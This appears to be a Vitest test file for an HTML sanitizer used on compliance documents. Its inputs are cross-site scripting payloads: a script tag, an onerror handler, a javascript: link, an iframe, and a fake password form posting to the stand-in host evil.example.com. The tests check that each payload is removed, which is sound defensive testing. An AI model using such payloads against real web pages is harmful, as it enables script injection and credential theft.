import { describe, it, expect } from "vitest";
import { sanitizeComplianceHtml } from "./sanitizeHtml";

describe("sanitizeComplianceHtml", () => {
  it("returns empty string for null/undefined/empty input", () => {
    expect(sanitizeComplianceHtml(null)).toBe("");
    expect(sanitizeComplianceHtml(undefined)).toBe("");
    expect(sanitizeComplianceHtml("")).toBe("");
  });

  it("preserves ordinary compliance markup (headings, lists, emphasis)", () => {
    const input =
      "<h2>Terms</h2><p>You agree to <strong>everything</strong>.</p><ul><li>One</li><li>Two</li></ul>";
    const out = sanitizeComplianceHtml(input);
    expect(out).toContain("<h2>Terms</h2>");
    expect(out).toContain("<strong>everything</strong>");
    expect(out).toContain("<li>One</li>");
  });

  it("strips <script> tags entirely", () => {
    const input = "<p>Hi</p><script>alert(1)</script><p>Bye</p>";
    const out = sanitizeComplianceHtml(input);
    expect(out).not.toContain("script");
    expect(out).not.toContain("alert");
    expect(out).toContain("<p>Hi</p>");
    expect(out).toContain("<p>Bye</p>");
  });

  it("strips inline event handlers (on*=)", () => {
    const input = '<img src="x" onerror="alert(1)" />';
    const out = sanitizeComplianceHtml(input);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert");
  });

  it("strips javascript: URLs from href", () => {
    const input = '<a href="javascript:alert(1)">click</a>';
    const out = sanitizeComplianceHtml(input);
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("alert");
  });

  it("blocks iframes outright", () => {
    const input = '<p>Safe</p><iframe src="https://evil.example.com"></iframe>';
    const out = sanitizeComplianceHtml(input);
    expect(out).not.toContain("iframe");
    expect(out).not.toContain("evil.example.com");
    expect(out).toContain("<p>Safe</p>");
  });

  it("strips <form> so an admin doc can't impersonate a login form", () => {
    // The form's `action` attribute is the actual exfiltration risk. DOMPurify
    // preserves children of forbidden block elements by default (KEEP_CONTENT),
    // so an orphan <input> may remain — that's harmless on its own (no form
    // to submit to, no scripts allowed).
    const input = '<form action="https://evil.example.com/x"><input name="pw" /></form>';
    const out = sanitizeComplianceHtml(input);
    expect(out).not.toContain("<form");
    expect(out).not.toContain("evil.example.com");
    expect(out).not.toContain("action=");
  });

  it("forces target=_blank + rel=noopener on links", () => {
    const input = '<a href="https://example.com">Example</a>';
    const out = sanitizeComplianceHtml(input);
    expect(out).toContain('target="_blank"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('href="https://example.com"');
  });
});
